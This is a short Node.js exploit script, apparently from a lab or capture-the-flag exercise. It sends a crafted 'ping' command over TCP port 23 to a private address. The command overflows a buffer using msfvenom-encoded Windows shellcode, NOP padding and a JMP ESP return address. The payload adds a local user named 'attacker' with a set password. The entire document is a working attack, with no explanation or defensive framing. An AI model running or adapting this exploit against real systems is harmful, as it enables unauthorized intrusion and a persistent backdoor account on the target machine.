const client = new require('net').Socket();

// msfvenom -p windows/adduser USER=attacker PASS=P@ssw0rd -f hex -b '\x00\x0A\x0D\x08' -e x86/call4_dword_xor
const shellcode = '31c983e9bbe8ffffffffc05e81760e80238e1e83eefce2f47ccb0c1e8023ee9765124e7a0b73be95d22f054c94a8fc368f94c438b1dc2222e15f8c32a0e2411381e46cecd274054c90a8c4220b6f9f66636b8fcfd1a8d73e81f0055798c0b4570b17051f561271b241ec831f471b6e6b7620f3e6bb5eaa6b647b0546a4225d780b2fc595d83f8fcd0b27051f50aaca3aa478d57fd979dfe1607cd1440b316593dd498f9305918e1e8073e62f0b4c09e155987eab2275e6b8159e13e1551f88628aa375fef52635599351e174807071cbe34eea30e55beb3eaf40ae70e557ae6bf346fc3ee157fa7fe348eb6ca073ce6df354be6ce403a15fc467ae38a603e07bf403e271e342e279f24cfb6ea062ea73e94de76df451ef6aef51fd3ee157fa7fe348eb6ca00ccf5ac4238e1e';
const jmpESP = '\x17\x37\xe4\x76';
const padding = '\x90'.repeat(1008 - shellcode.length / 2);

const ping = `ping aaaa${Buffer.from(shellcode, 'hex').toString('latin1')}${padding}${jmpESP}${padding}\r\n`;

client.connect(23, '172.19.96.1', () => client.write(ping, 'latin1'));
